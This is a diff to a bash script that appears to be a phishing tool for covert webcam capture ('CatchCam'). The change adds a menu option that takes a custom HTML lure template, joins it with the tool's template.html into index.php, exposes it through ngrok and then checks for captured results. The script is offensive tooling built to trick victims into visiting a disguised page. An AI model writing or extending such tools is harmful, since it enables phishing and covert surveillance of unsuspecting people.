@@ -242,6 +242,7 @@ printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Custom template(.html file)\e[0m\n"
 
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
@@ -256,6 +257,29 @@ ngrok_server
 
 elif [[ $option_server -eq 3 ]]; then
 lhost_server
+
+elif [[ $option_server -eq 4 ]]; then
+default_website_template="CatchCam.html"
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Template file: \e[0m' website_template
+website_template="${website_template:-${default_website_template}}"
+if [[ -f $website_template ]]; then
+
+if [[ $website_template == *'index.php'* ]]; then
+printf "\e[1;91m[!] Rename your template and try again.\e[0m\n"
+exit 1
+fi
+
+cat $website_template > index.php
+cat template.html >> index.php
+ngrok_server
+checkfound
+else
+printf "\e[91m[!] File not found\n"
+printf " For Any help search 'github.com/Ch33chOficial'\n"
+
+
+exit 1
+fi
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
